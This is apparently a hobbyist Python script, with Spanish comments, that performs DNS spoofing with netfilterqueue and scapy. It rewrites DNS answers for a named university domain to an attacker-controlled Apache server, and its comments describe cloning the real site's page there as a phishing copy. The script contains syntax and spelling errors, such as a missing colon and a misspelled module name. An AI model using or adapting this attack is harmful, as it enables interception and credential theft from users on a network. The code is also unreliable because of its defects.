#!/usr/bin/python

#pip install netfilterqueue
#service apache2 start
#Save page as... boton derecho en la web a clonar
#Quitar todos los archivos de la ruta del apache server (var/www/html)
#Mover el html descargado a la carpera del apache (decir que suele haber un html y otro sin extensión)
#Renamear el html de la web clonada a index.html para que salga al entrar al apache server

import netfilterqueue
import scapy.all as scapy


def del_fields(scapy_packet)
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname= scapy_packet[scapy.DNSQR].qname
        if "arh.bg.ac.rs" in qname:
            answer = scapy.DNSRR(rrname=qname, rdata="ip de tu apache2 o donde quieras redirigir")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            scapy_packet = del_fields(scapy_packet)

            packet.set_payload(str(scapy_packet))
    packet.accept()



queue = netfiltrqueue.NetFilterQueue()
queue.bind(0,process_packet)
queue.run()


'''def findDNS(p):
    if p.haslayer(DNS):
        print p[IP].src, p.[DNS].summary()



sniff(prn=findDNS)'''